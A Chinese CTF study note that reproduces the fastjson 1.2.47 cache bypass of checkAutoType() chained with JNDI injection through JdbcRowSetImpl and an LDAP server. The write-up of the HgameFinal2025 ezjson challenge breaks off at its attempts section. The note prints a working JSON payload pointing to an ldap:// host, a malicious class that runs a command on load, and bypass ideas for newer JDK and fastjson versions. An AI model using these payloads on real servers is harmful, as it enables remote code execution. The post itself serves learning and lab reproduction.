---
title: fastjson+jndi 漏洞复现及 HgameFinal 某题复现
categories:
- Note&Summary
tag:
- CTF
- web
- java
- 反序列化
- WriteUp
- fastjson
- JNDI
- 绕过
date: 2025-04-14 23:51:22
excerpt: 磨了好一段时间......
index_img: /img/wallhaven-yxxzqx.jpg
banner_img: /img/wallhaven-yxxzqx.jpg
---

# fastjson+jndi 漏洞复现及 HgameFinal 某题复现

# 阅前声明

本篇内容涉及 fastjson 反序列化漏洞（主要 1.2.47）、jndi 注入漏洞（主要 com.sun.rowset.JdbcRowSetImpl 用 ldap 返回 Reference 加载远程类方式）、HgameFinal2025-ezjson 复现（fastjson1.2.47+JdbcRowSetImpl 用 ldap 返回数据流 +Jackson 原生反序列化）。此外还包括部分 jdk 版本、依赖版本的各种绕过方式，但由于篇幅有限不宜过多，所以除了切实实践过的内容外主要列举我所学习到的文章。

本篇目的在于记录学习过程学习成果、方便回顾、快速查询资料，参考了大量文章，所以有许多的文章链接、引用（文章内容可能部分有重复），且基本标注了各篇文章我认为帮助了我理解的内容或其长处。同时，由于初学，内容偏基础，经过多次改动修正。

# 漏洞复现环境配置注意事项

为了方便漏洞复现，使用的 jdk 版本要 1.8，且小于等于 oracle 8u191，我这次使用的是 oracle 8u181，官网下载需要注册账户，可以选择华为镜像源下载。一定要注意 jdk 版本，否则无法顺利执行命令。下面的原理分析及攻击实现流程分析均针对 oracle 8u181，fastjson1.2.47。

[idea 更换 jdk 版本修改位置](https://blog.csdn.net/qq_43362426/article/details/111370493)

# 原理分析

## fastjson 功能、序列化反序列化

即将 JavaBean 转为 json 字符串或解析 json 转为 JavaBean，即序列化与反序列化的操作

关于 java 的序列化反序列化是什么样子、原生序列化方式和 fastjson 序列化方式的区别可以参照[这篇](https://www.freebuf.com/articles/web/369926.html)前半部分看一看

## 个人理解

个人认为 fastjson 反序列化漏洞主要暴露的风险是：攻击者可以通过这个漏洞实现部分 java 类、实例等的操控，而后就是利用例如 JdbcRowSetImpl、TemplatesImpl 进行 JNDI 注入。

也就是说个人感觉要比较全面地分析攻击的实现需要分为两部分：一个就是 fastjson 反序列化漏洞本身是如何产生的、不同的安全检测是如何绕过的；另一个就是 fastjson 反序列化漏洞可以利用后，可以结合其他哪些漏洞 RCE、这些漏洞或特性是如何产生如何利用的，该如何寻找这些可利用的漏洞或特性或类（感觉我完全不具备这个能力，阿巴阿巴.jpg，日后继续努力）。

那么 fastjson 漏洞是怎么产生的呢，主要是 @type 属性可以在 JSON 字符串中指定反序列化时应该实例化的具体类，而相应的安全检测、补丁（`checkAutoType()`）存在缺陷，致使攻击者可以指定一些可执行命令或进行其他恶意操作的危险类反序列化。

## fastjson 的 checkAutoType()源码分析

简单写一个服务，导入 fastjson1.2.47 包，使用 fastjson 的方法进行调试

```java
import com.alibaba.fastjson.JSON;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
 
@RestController
public class mainController {

    @PostMapping({"/"})
    public String parseJson(@RequestBody String json) {
        Object obj = JSON._parseObject_(json);
        return "Parsed: " + obj.getClass().getName();
    }
}
```

发包 json 参数让目标反序列化处理

```
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
```

{% fold info @此部分可略过，使用ctrl+N直接查找checkAutoType() %}

使用 fastjson 的 `parseobject()` 后在 JSON.class 调用：

```java
public static JSONObject parseObject(String text) {
    Object obj = _parse_(text);        //步入该句parse
    if (obj instanceof JSONObject) {
        return (JSONObject)obj;
    } else {
        try {
            return (JSONObject)_toJSON_(obj);
        } catch (RuntimeException var3) {
            RuntimeException e = var3;
            throw new JSONException("can not cast to JSONObject.", e);
        }
    }
}
```

步入 `parse(text)`

```java
public static Object parse(String text) {
    return _parse_(text, _DEFAULT_PARSER_FEATURE_);  //步入该句parse
}
```

继续步入 `parse(text,  _DEFAULT_PARSER_FEATURE_ )`

```java
public static Object parse(String text, int features) {
    return _parse_(text, ParserConfig._getGlobalInstance_(), features);    //步入该句parse
}
```

继续步入，选中 `parse`

```java
public static Object parse(String text, ParserConfig config, int features) {
    if (text == null) {
        return null;
    } else {
        DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
        Object value = parser.parse();    //步入该句parse
        parser.handleResovleTask(value);
        parser.close();
        return value;
    }
}
```

实例化 `DefaultJSONParser` 对象后继续步入 `parse()`

```java
public Object parse() {
    return this.parse((Object)null);
}
```

继续步入

![](/img/fastjsonAndJNDI/PYPQbdNuCoA8M8xrc12csAtbnlC.png)

继续步入

![](/img/fastjsonAndJNDI/QkLobDJaioKbBvxIAgEc6ZYNn8R.png)

继续步入

```java
public Object parse() {
    return this.parse((Object)null);    //步入该句parse
}
```

{% endfold %}

总之盯准 parse 一层层进入即可看到 fastjson 反序列化的大致流程，随后就可以发现对 `@type` 的检测处理，使用 `checkAutoType()` 对 `@type` 后面的用户指定类检查过滤，加载返回一个该类的对象

![](/img/fastjsonAndJNDI/LoDZblh8HoZ6I9xWOgycFOGlnzf.png)

步入观察源码

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
    if (typeName == null) {    //判断类名非空
        return null;
    } else if (typeName.length() < 128 && typeName.length() >= 3) {  //判断类名长度，否则抛出异常
        String className = typeName.replace('$', '.');
        Class<?> clazz = null;
        //该部分使用了hash算法初步处理，为了后续跟hash处理过的黑白名单匹配
        long BASIC = -3750763034362895579L;
        long PRIME = 1099511628211L;
        long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
        if (h1 == -5808493101479473382L) {
            throw new JSONException("autoType is not support. " + typeName); //类名以 [ 开头抛出异常
        } else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
            throw new JSONException("autoType is not support. " + typeName); //类名以 L 开头 ; 结尾抛出异常
        } else {
            long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L ^ (long)className.charAt(2)) * 1099511628211L;
            long hash;
            int i;
            //当autoTypeSupport开启或期望的类不为空时（上一步的图片中调用checkAutoType时可以看到传入的expectClass为null）
            if (this.autoTypeSupport || expectClass != null) {
                hash = h3;

                for(i = 3; i < className.length(); ++i) {
                    hash ^= (long)className.charAt(i);
                    hash *= 1099511628211L;
                    //先检查hash值是否在白名单中存在，存在则_loadClass_加载类并返回对象
                    if (Arrays._binarySearch_(this.acceptHashCodes, hash) >= 0) {
                        clazz = TypeUtils._loadClass_(typeName, this.defaultClassLoader, false);
                        if (clazz != null) {
                            return clazz;
                        }
                    }

                    //后检查hash值是否在黑名单中存在，存在则直接抛出异常
                    if (Arrays._binarySearch_(this.denyHashCodes, hash) >= 0 && TypeUtils._getClassFromMapping_(typeName) == null) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
            }

            //如果经过上面黑白名单检查后或autoTypeSupport未开启等原因导致未检查后clazz仍为null
            if (clazz == null) {
                clazz = TypeUtils._getClassFromMapping_(typeName);//那么在TypeUtils.mappings中缓存的类寻找目标
            }

            //如果上述黑白名单检查后及TypeUtils.mappings缓存类查找后仍未找到该类（clazz为null）
            if (clazz == null) {
                clazz = this.deserializers.findClass(typeName);//则在deserializers中继续寻找
            }

            //如果上述三个途径有任意一个找到了，clazz不为null
            if (clazz != null) {
                if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                } else {
                    return clazz;//那么直接返回对象
                }
            } else {//上述三个途径仍未找到
                if (!this.autoTypeSupport) {//且autoTypeSupport关闭
                    hash = h3;

                    //跟前面差不多的黑白名单检查，但先黑后白
                    for(i = 3; i < className.length(); ++i) {
                        char c = className.charAt(i);
                        hash ^= (long)c;
                        hash *= 1099511628211L;
                        if (Arrays._binarySearch_(this.denyHashCodes, hash) >= 0) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }

                        if (Arrays._binarySearch_(this.acceptHashCodes, hash) >= 0) {
                            if (clazz == null) {
                                clazz = TypeUtils._loadClass_(typeName, this.defaultClassLoader, false);
                            }

                            if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                            }

                            return clazz;
                        }
                    }
                }

                if (clazz == null) {//不论autoTypeSupport是否开启均黑白名单检查过后，且TypeUtils.mappings、deserializers寻找后均未找到
                    clazz = TypeUtils._loadClass_(typeName, this.defaultClassLoader, false);//则使用TypeUtils.loadClass尝试加载这个类
                }

                if (clazz != null) {//上面TypeUtils._loadClass成功加载了该类则再做一些安全处理_
                    if (TypeUtils._getAnnotation_(clazz, JSONType.class) != null) {
                        return clazz;
                    }

                    //禁止反序列化ClassLoader和DataSource，做一些安全措施
                    if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }

                    if (expectClass != null) {
                        if (expectClass.isAssignableFrom(clazz)) {
                            return clazz;
                        }

                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }

                    JavaBeanInfo beanInfo = JavaBeanInfo._build_(clazz, clazz, this.propertyNamingStrategy);
                    if (beanInfo.creatorConstructor != null && this.autoTypeSupport) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }

                int mask = Feature._SupportAutoType_.mask;
                boolean autoTypeSupport = this.autoTypeSupport || (features & mask) != 0 || (JSON._DEFAULT_PARSER_FEATURE _& mask) != 0;
                if (!autoTypeSupport) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else {
                    return clazz;
                }
            }
        }
    } else {
        throw new JSONException("autoType is not support. " + typeName);
    }
}
```

大致分析一下主要逻辑：当 `autoTypeSupport` 关闭时，第一次针对 `autoTypeSupport` 开启时的黑白名单检查不会进行，如果在 `TypeUtils.mappings`、`deserializers` 中可以找到目标类，那么直接加载该类返回对象，如果找不到，那么进行第二次的针对 `autoTypeSupport` 关闭时的黑白名单检查，还找不到则尝试使用 `TypeUtils.loadClass` 加载这个类并做安全处理；当 `autoTypeSupport` 开启时，第一次的黑白名单检查无法绕过，必然会执行，后面再在 `TypeUtils.mappings`、`deserializers` 中查找，找不到则尝试使用 `TypeUtils.loadClass` 加载这个类并做安全处理。

通过以上对 `checkAutoType()` 分析，我们可以发现一个逻辑上的漏洞：当 `autoTypeSupport` 关闭时，只要可以让目标类在 `TypeUtils.mappings`、`deserializers` 中被找到，那么就可以绕过后面针对 `autoTypeSupport` 关闭时的黑白名单检测，调用恶意类实现攻击。

所以接下来需要找到可以控制 `TypeUtils.mappings`、`deserializers` 的方法。这里主要借鉴了[素十八这篇文章](https://su18.org/post/fastjson/#7-fastjson-1247)，讲得十分详细，这里我暂时无法较为独立地去查看、分析各个方法，所以主要摘取[素十八这篇文章](https://su18.org/post/fastjson/#7-fastjson-1247)（这里直接看原文得了，或者看最下面参考资料的[视频](https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885)里也有讲解）

![来自素十八](/img/fastjsonAndJNDI/ZBSTbwWhWo3QtlxwV5kcotiRnxf.png)

![来自素十八](/img/fastjsonAndJNDI/RQd5bou7go3LwVxe8Y8cfiUNn6c.png)

![来自素十八](/img/fastjsonAndJNDI/HW3pbvns9oc0W7xlOaccx2PHnrc.png)

![来自素十八](/img/fastjsonAndJNDI/EzBibGpPioWr7Px5zqscYkacnce.png)

总结一下：`deserializers` 没有可控地写入目标类的方法，`TypeUtils.mappings` 则可以使用 `loadClass` 方法将目标类加载入 `mappings` 缓存，而 `loadClass` 方法一共有三个重载方法，其中 `Class<?> loadClass(String className, ClassLoader classLoader)` 方法会在 `fastjson` 包中的 `com.alibaba.fastjson.serializer.MiscCodec#deserialze` 方法中被调用（`MiscCodec` 就是 fastjson 的一个反序列化器，用来处理各种反序列化类），筛选使用 `MiscCodec` 处理的类，发现其中包含 `Class.class`，同时刚好 `Class.class` 会在 `deserializers` 初始化时加载。

也就是说如果反序列化目标 class 是 `Class.class` 时，`deserializers` 中可以找到该类直接加载返回，然后反序列化会调用 `MiscCodec` 的 `loadClass` 方法，将其中的参数 strVal 进行类加载并缓存，那么我们先将 `Class.class` 作为反序列化目标类把恶意利用类名放在 strVal 中，从而在处理 `Class.class` 反序列化时将恶意利用类加载入 `TypeUtils.mappings` 缓存，最终反序列化恶意利用类时绕过 `checkAutoType()` 的黑白名单检测。

## JNDI 简要分析

在 fastjson 反序列化可以实现后，有各种适用不同情况的利用链可以选择，这里先简单研究一下比较常见的通过 `com.sun.rowset.JdbcRowSetImpl` 实现 JNDI 注入。

JNDI（Java Naming and Directory Interface），即 Java 命名和目录接口，它用于给 Java 应用程序提供命名和目录访问服务。类似开发时经常使用到的 jdbc，都是构建在抽象层上，jdbc 相当于实现 java 与一个数据库之间的联系交互，而 JNDI 则可以实现与目录列表中多个数据库动态访问，将对象和名称联系在一起，并通过指定的名称找到相应的对象。

JNDI 可访问的目录及服务有：DNS、XNam、Novell 目录服务、LDAP(Lightweight Directory Access  Protocol 轻型目录访问协议)、CORBA 对象服务、文件系统、Windows XP/2000/NT/Me/9x 的注册表、RMI（Remote Method Invocation 远程方法调用）、DSML v1&v2、NIS 等。其中相对常用的即 RMI、LDAP、DNS、CORBA。JNDI 就可以当作在这些服务的基础上一个方便使用的统一的接口，通过这个接口去定位、调用资源。

JNDI 注入实现的核心是 `javax.naming.InitialContext#lookup()` 参数可控，`lookup()` 函数用于查找传入的对象名称参数对应的对象，可以指定 url 来绑定远程对象加载，之后执行该类的静态代码块、代码块、无参构造函数和 `getObjectInstance` 方法。显而易见的是，控制了 `lookup()` 参数就可能实现远程向目标服务器加载恶意代码。具体原理可以参照 [myzxcg 的基础概念](https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5)、[nice_0e3](https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86)[的前置知识](https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86)。

JNDI 注入常用的协议为 rmi 和 ldap，各自都有一些使用限制如下

![来自myzxcg](/img/fastjsonAndJNDI/OVLVbHvzwoMxdjx3hKsc05BUnyh.png)

# 攻击实现流程分析

idea 中连按两下 shift 搜索 `checkAutoType()` 打个断点（`autoTypeSupport` 是默认关闭的状态）

向本地服务发包 json 参数让目标反序列化处理，使用的 payload 由上面的分析中得来：先将 `Class.class` 反序列化（本身会 `deserializers` 初始化时加载，`deserializers` 中可以找到该类，从而不受黑白名单限制），加载的过程中将 `"val"` 中的 `JdbcRowSetImpl` 加载入 `TypeUtils.mappings` 缓存；然后再反序列化 `JdbcRowSetImpl` 类，由于可以在 `mappings` 缓存中找到 `JdbcRowSetImpl` 类，所以直接加载对象并返回，绕过黑白名单检查；加载对象后连接 `"dataSourceName"` 的远程 ldap 服务并执行远程对象恶意代码实现 JNDI 注入。

第一个对象将指定类存入缓存绕过 fastjson 检测，第二个对象用来触发 JNDI 注入。

```
{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8085/PrIXqXOz","autoCommit":true}}
```

## fastjson 部分

第一轮调用 `checkAutoType()`，处理 `java.lang.Class`

![](/img/fastjsonAndJNDI/EGAIbA47XonaJPxVLD0cZoxEnkg.png)

初步 hash 处理后 `autoTypeSupport` 默认关闭，传入参数 `expectClass` 为 null，所以第一个黑白名单不检查

![](/img/fastjsonAndJNDI/FMzvbE2ZUoxTGdxQgrScq23Gn5b.png)

`deserializers` 中找到该类，加载并返回

![](/img/fastjsonAndJNDI/Xt7gb0myXo5rD3xo50vcao6Pn7b.png)

第一轮 `checkAutoType()` 结束，回到 DefaultJSONParser

![](/img/fastjsonAndJNDI/PXXrbSExmoY4VPxz0aBcFYy4nae.png)

向后步过可以看到反序列化处理 `obj = deserializer.deserialze(this, clazz, fieldName);`，使用的反序列化器即前面提到的 `MiscCodec`，我们在这句步入观察反序列化处理过程

![](/img/fastjsonAndJNDI/NKYebUFU9oGVaWx6XTUcr7Ahnje.png)

向后步过，开始处理参数 `"val":"com.sun.rowset.JdbcRowSetImpl"`

![](/img/fastjsonAndJNDI/EKhpbHYIqoIIBuxGswicLz3DnWe.png)

随后 `objVal` 就将参数中的类名字符串赋值给前面提到的 `strVal`，当 `strVal` 非空就逐个匹配当前反序列化的类

![](/img/fastjsonAndJNDI/Gt3Vb2X2MotFaLxu6eXcTkZ2nxf.png)

匹配到 `Class.class`，于是加载 `strVal` 类并返回，这里选中 `loadClass` 步入观察 `JdbcRowSetImpl` 加载过程

![](/img/fastjsonAndJNDI/Ub0Fb9ZIpoTf1bx1ktxc2IEknxd.png)

继续步入 `loadClass`，注意当前版本 cache 默认为 true，这也是这个版本缓存绕过方法可行的原因之一

![](/img/fastjsonAndJNDI/GcsibIxfcoBQ6jx7rFLcl22qnHf.png)

检测类名 `className` 非空

![](/img/fastjsonAndJNDI/N8eVb77ogo9BnAxYp0kcCVUgnkd.png)

尝试从 `mappings` 缓存中获取类名为 `com.sun.rowset.JdbcRowSetImpl` 的对象

![](/img/fastjsonAndJNDI/HCwlbegP0o8PkhxGeKqcZpRpnjh.png)

正常情况下缓存中没有 `com.sun.rowset.JdbcRowSetImpl`，返回 clazz 为 null，无法直接返回 clazz。（第一次运行时是这样，成功一次后 `mappings` 中就有了，不会出现这张图）

![](/img/fastjsonAndJNDI/MXcMbxwmXo1iVTxlvZDcmtCVnvd.png)

当缓存中已有 `com.sun.rowset.JdbcRowSetImpl` 时如下图，它就不会继续加载，直接返回。（想看上图则重启项目再调试一遍）

![](/img/fastjsonAndJNDI/SgSTbiT4xotwYExKUXocZ0pwn3G.png)

判断是否 `[` 开头或 `L` 开头 `;` 结尾

![](/img/fastjsonAndJNDI/F2g3bxZYvobplrxjtZCcVVWpnnh.png)

继续向后步过，因为前面传入的参数为 `getDefaultClassLoader()`，而 `com.sun.rowset.JdbcRowSetImpl` 类没有指定的默认 `classLoader`，所以为 null。此处用 `contextClassLoader.loadClass(className)` 加载类，并 cache 为 true 的情况下将其放入 `mappings` 缓存，最后 return 返回

![](/img/fastjsonAndJNDI/BKvpbsiz3oMzLJxt73mcCrylndc.png)

马上 `mappings` 里就找得到 `com.sun.rowset.JdbcRowSetImpl` 了

![](/img/fastjsonAndJNDI/JqHMbkNLBoHTxZxvGZfcSso3n2g.png)

后续直接按一次恢复程序按钮到断点处，第二轮调用 `checkAutoType()`，处理 `com.sun.rowset.JdbcRowSetImpl`，第一个黑白名单同样不检查

![](/img/fastjsonAndJNDI/OsshbUeaKoHMzPxY09Uc4SoZnae.png)

步过到 `TypeUtils.mappings`、`deserializers` 查找

![](/img/fastjsonAndJNDI/SWSubfWXgopJDuxirm4cPFjsndc.png)

可以从 `TypeUtils.mappings` 找到 `JdbcRowSetImpl`

![](/img/fastjsonAndJNDI/RSKkbd2KlobPZKxUmCSccPiHnYe.png)

返回 clazz，至此第二轮 `checkAutoType()` 结束，成功利用缓存机制绕过了黑名单检测

![](/img/fastjsonAndJNDI/HNRob7q2LovezHxnjUhcgmsVnXg.png)

回到 DefaultJSONParser

![](/img/fastjsonAndJNDI/LFcSbw1edoX53jxpndDcAIUwnUe.png)

## JNDI 部分

同之前一样步入反序列化处理 `obj = deserializer.deserialze(this, clazz, fieldName);` 但此处 `fieldName` 不为 null

![](/img/fastjsonAndJNDI/E68IbUqMmouMhux3e87cpx7Nnmc.png)

继续步入，`features` 默认为 0

![](/img/fastjsonAndJNDI/UD6hbjy9Hohy8fxriDAcN615n4e.png)

这里不清楚什么原因没调进去，修改了一下 debug 的步入设置也不成，

![](/img/fastjsonAndJNDI/Zys3bZWG1ovJpIxSAWhcLFRpnle.png)

所以直接在 `JdbcRowSetImpl` 文件里查找 `lookup()` 函数打断点

![](/img/fastjsonAndJNDI/B2X9bngFaoyaLzxffZPcUsMwnog.png)

步入此处 `lookup()`

![](/img/fastjsonAndJNDI/DGWCbWBmPoTSuZxpWqcc4aLHn7e.png)

额似乎步入的是 `getDataSourceName()`，获取 `DataSourceName` 参数内容

![](/img/fastjsonAndJNDI/VBpBbwOvDoYvYSxFHbTc7hnJnzc.png)

步过回到刚才的位置再次步入就进到 `lookup()` 函数的调用了，位于 `InitialContext` 类（可以参考[这里](https://www.cnblogs.com/nice0e3/p/13958047.html#initialcontext%E7%B1%BB)了解一下）。继续步入，选中 `lookup(name)`

![](/img/fastjsonAndJNDI/CKaUbhWlIoaaIhx9orlcoDL1nHh.png)

进入 `ldapURLContext` 类，继续向 `lookup(var1)` 步入

![](/img/fastjsonAndJNDI/O93jbV5GZoMg05xFqt3cdOLQnCd.png)

进入 `GenericURLContext` 类，先 `this.getRootURLContext(var1, this.myEnv)` 和 `var2.getResolvedObj()` 大概对参数做一下解析，获取其中的 ldap 服务 ip 和远程类名

![](/img/fastjsonAndJNDI/TpR3bgnLHoiXJdxZ5cUcyxa4nAV.png)

尝试继续步入 `lookup(var2.getRemainingName())` 选中 `lookup`

![](/img/fastjsonAndJNDI/TVpMbZ69AoACdSxbPDUcFDz5niN.png)

该句步过后则结束跳出到下图了，没有再继续深入分析下去了......

![](/img/fastjsonAndJNDI/RYxibeFlkoztihxTM23cQoqEnEg.png)

恶意代码成功执行，系统命令成功执行，弹出计算器

## 补充：ldap 服务端

为了方便、节省时间，用的 Yakit 的反连服务器搭建 ldap 服务端，用 marshalsec 也 OK，网上有很多现成的拿来改一下即可。

![](/img/fastjsonAndJNDI/PJQabTVjqoF9vaxRJXqcTpJwnIe.png)

生成的恶意利用类 payload 如下（存疑）

```
package defaultpackagename;

import java.io.File;
import java.io.IOException;

public class PrIXqXOz {
        static  {//静态代码块，首次加载时自动执行
                String var0 = "calc";//要执行的命令
                //通过文件分隔符检测Unix/Linux系统
                //这里似乎有些问题 Windows系统返回"\"，应该再写一个else？
                //但是无论如何复现时在windows上是可以执行命令的
                if (File.separator.equals("/")){
                        String[] var1 = new String[3];//空的？？？
                }
                try{
                        Runtime.getRuntime().exec(var1);//用Runtime类执行
                }catch(IOException var1){
                        var1.printStackTrace();
                }
        }
}
```

正常应该是这样的吧：

```
package defaultpackagename;

import java.io.File;
import java.io.IOException;

public class PrIXqXOz {
        static  {//静态代码块，首次加载时自动执行
                String[] var1;
                if (File.separator.equals("/")){//通过文件分隔符检测 Unix/Linux系统
                        var1 = new String[]{"gnome-calculator"};
                }else{//通过文件分隔符检测 windows系统
                        var1 = new String[]{"calc"};
                }
                
                try{
                        Runtime.getRuntime().exec(var1);//用Runtime类执行
                }catch(IOException var1){//如果命令执行发生异常捕获IOException防止进程崩溃
                        var1.printStackTrace();
                }
        }
}
```

## 整体流程

{% note warning %}

**补充：**以下是我最初画的图，但后来发现 JNDI 部分不够准确（懒得改了），由于一开始我用的是 Yakit（用了协议端口复用技术）而没有自己写服务端，我混淆了流程中的两个步骤，在下图的步骤 6、7 中应当是一次 ldap 请求获取 Reference，一次 http 请求获取远程类（请求类型和远程类地址等均由 Reference 指定），需要两个服务端。该图仅针对上面的分析流程，看个大概即可。

{% endnote %}

![](/img/fastjsonAndJNDI/A9J7bOwKnoumiNxpexTcJmtanGf.png)

{% note warning %}

在网上看到了（据说是）bitterz 师傅的流程图如下，一下子给我点通了不少，在这里也补充一些 JNDI 注入的内容。该图展示的是 JNDI 注入的流程，先使用 rmi 或 ldap 进行一次指定地址的通信，按所给类名查找并获取其对应的 Reference 类（该类是 javax.naming 的一个类，表示对在命名/目录系统外部找到的对象的引用。我的理解是相当于给你一个清单，告诉你要做啥、要准备啥（类）），其中包含了要在客户端（受害者）创建的类、所需的工厂类及地址，那么工厂类首先在本地 ClassPath 中寻找加载，找不到则从 Reference 指定的远程地址下载工厂类 Factory，然后将其实例化触发恶意代码的执行。
那么结合“补充：ldap 服务端”部分的截图可知，当 jdk 版本不符合要求时，第 4 步骤受影响未能发出请求，从而 Yakit 服务端只接收到 ldap 请求获取 Reference 而无 http 请求下载工厂类。这具体是为什么呢？在下面“其他版本的绕过”jdk 部分结合流程图继续分析......

{% endnote %}

![来自bitterz](/img/fastjsonAndJNDI/WqLZb4gQGoeGDPxb7bfcrLxMn0L.png)

# 其他版本的绕过

## Jdk-关于 JNDI 注入

主要参考 [R0ser1](https://www.cnblogs.com/R0ser1/p/17105579.html)、[bitterz](https://www.cnblogs.com/bitterz/p/15946406.html)、[KINGX](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)，这里仅简要说明

**RMI：**在 JDK 6u141, JDK 7u131, JDK 8u121 中 Java 限制了 Naming/Directory 服务中 JNDI  Reference 远程加载 Object Factory 类的特性。系统属性  `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。

**LDAP：**在 Oracle JDK 11.0.1、8u191、7u201、6u211 之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为 false，ldap 也同样无法远程加载 Reference 工厂类。

总而言之，当 jdk 版本较高时上图（bitterz 师傅的流程图）第 4 步骤在系统默认情况下外部工厂类不受信任，为禁用状态，普通的利用方式也就行不通了。那么有什么 jdk 高版本 JNDI 注入绕过方式呢？

- 思路一：执行步骤 3 时，利用受害者本地的工厂类实现 RCE
- 思路二：受害者向 LDAP 或 RMI 服务器请求 Reference 类后，将从服务器下载字节流进行反序列化获得 Reference 对象，此时即可利用反序列化 gadget 实现 RCE

### 利用本地的工厂类

这个思路比较清晰，既然第 4 步被禁用，那么就尝试在此之前从本地加载工厂类。这个方法需要能够探测出使用的依赖或者是白盒审计知道有哪些依赖。这里主要有两种方式，均需要有 Tomcat 的依赖，触发有大概 Tomcat7、8 的版本限制，高版本的 Tomcat 或许可以参考一下 [https://xz.aliyun.com/news/16156](https://xz.aliyun.com/news/16156)

- 基于 org.apache.naming.factory.BeanFactory：该类有一个 getObjectInstance()方法会把 Reference 对象的 className 属性作为类名去调用无参构造方法实例化一个对象。然后再从 Reference 对象的 Addrs 参数集合中取得 AddrType 是 forceString 的 String 参数。其中 propName 和 param 可以用于反射调用指定的方法。那么利用该类就可以调用本地其他依赖的类实现攻击。常见可利用的包括 ELProcessor、groovy、SnakeYaml 等等。
- 基于 org.apache.catalina.users.MemoryUserDatabaseFactory：主要是可以通过 XXE 实现 RCE，具体未作研究

### 服务端返回数据流反序列化 gadget

rmi 和 ldap 服务除了返回 Reference 外也可以直接返回一段恶意序列化数据，不走原本的 3、4 步，然后使用合适的可用依赖反序列化 gadget

## fastjson

对于 fastjson 其他版本，除了太老的版本外基本都是在 `checkAutoType()` 上做改动，许多涉及的设置、参数在本文当中也有提到，例如：

1.2.47 前的一些版本中漏洞主要出现在字符串处理，通过插入描述符 `[`、`L`、`;` 或双写等方法绕过检测；

1.2.68 版本中 `MiscCodec` 设置了 `cache` 默认为 false 后可以利用 `expectClass` 绕过 `checkAutoType()`，1.2.47 时上面的分析可以看到 `expectClass` 默认为 null，1.2.68 时如果函数有 `expectClass` 入参，且我们传入的类名是 `expectClass` 的子类或实现，并且不在黑名单中，那么就可以通过 `checkAutoType()` 的安全检测；

总而言之，对 1.2.47 的漏洞一整个研究理解下来之后再去看别的版本会轻松一些，这里不再细致分析了，具体内容就去看参考的这几篇文章即可：

[https://su18.org/post/fastjson/](https://su18.org/post/fastjson/)

[https://www.freebuf.com/vuls/361576.html](https://www.freebuf.com/vuls/361576.html)

[https://goodapple.top/archives/832](https://goodapple.top/archives/832)

# HgameFinal2025 赛题复现-ezjson

## 打开 jar 包配置调试项目

题目给了后端 jar 包，我们需要对其进行调试分析。跟 Hgame2025 的 SigninJava 一样，在 idea 里 Add as Library 添加为库即可查看源码，但是这里（及以上漏洞复现）我为了能够调试分析更深层的原理，于是手动迁移项目：

idea 新建空项目，将 jar 包用解压缩软件打开并复制其中 `/BOOT-INF/classes/` 内的内容至 idea 空项目的 `/src/main/java/` 下

![](/img/fastjsonAndJNDI/JKCTbzL4CoEfm5x5Oyxc3dFLnsh.png)

但此时仍为里面 `.class` 文件，于是使用 jd-gui 工具将其反编译为 `.java` 源文件替换入新项目

![](/img/fastjsonAndJNDI/Knmsbj5UtoxpNyxplNTcoMoNnpd.png)

![](/img/fastjsonAndJNDI/EqglbFfG4ocImhxTHNocpovbnrh.png)

然后将 `/BOOT-INF/lib/` 下的依赖全部导入新项目

![](/img/fastjsonAndJNDI/EY3PbTSdEoL9Nzx4Iemc0ZGVnWb.png)

![](/img/fastjsonAndJNDI/DfMsbIl8hobbkKxFWgZcSA2gnKb.png)

至此项目迁移完毕

## 主要内容

其中 Controller 源码如下（其他没有什么可看的了）

```java
package hgame.mysid.ezjson.Controller;

import com.alibaba.fastjson.JSON;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.Set;


@RestController
public class mainController {
    @GetMapping({"/"})
    public String index() {
        return "Welcome to Hgame2025-Final.";
    }
   
    @PostMapping({"/parse"})
    public String parseJson(@RequestBody String json) {
        Object obj = JSON._parseObject_(json);
        return "Parsed: " + obj.getClass().getName();
    }
}
```

所有依赖如下

![](/img/fastjsonAndJNDI/EuMPbfHRToyF4Exfh78ckJWInrh.png)

## 尝试过程

